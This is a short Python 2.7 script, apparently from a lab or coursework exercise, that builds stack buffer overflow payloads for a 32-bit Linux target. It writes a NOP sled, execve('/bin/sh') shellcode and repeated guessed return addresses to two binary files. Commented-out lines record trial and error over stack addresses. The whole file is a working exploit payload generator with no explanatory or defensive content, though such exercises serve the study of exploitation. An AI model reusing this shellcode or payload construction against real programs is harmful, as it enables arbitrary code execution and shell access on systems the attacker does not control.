#!/usr/bin/env python2.7
from struct import *
import sys

buf = b''

# NOP sled
buf += b'\x90' * (276 + 250)

# shellcode, around ~ 40 bytes
buf += b'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b'
buf += b'\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd'
buf += b'\x80\xe8\xdc\xff\xff\xff/bin/sh'

buf += b'\x90' * 3

# if "0" in str(hex(int(sys.argv[1]))):
#     exit()

# lower_bound = 4294901760
# upper_bound = 4294967295

# 0xffffd190 works for attack 1 on the stack
# 

# addr = int("0xffffdb58", 16)

# buf += pack("I", addr) * 250

# 0xffff????

# for i in range(lower_bound, upper_bound+1):
#     buf += pack("I", i) * 250
#     break

# return address (?)
# 0xffffd390
# 0xffffd3d0
# buf += b'\xb0\xce\xff\xff' * 250

with open("shellcode.bin", "wb") as f:
    f.write(buf)    

# ------
    
addr = int("0xffffda58", 16)
buf = pack("I", addr) * 550

with open("shellcode2.bin", "wb") as f:
    f.write(buf)
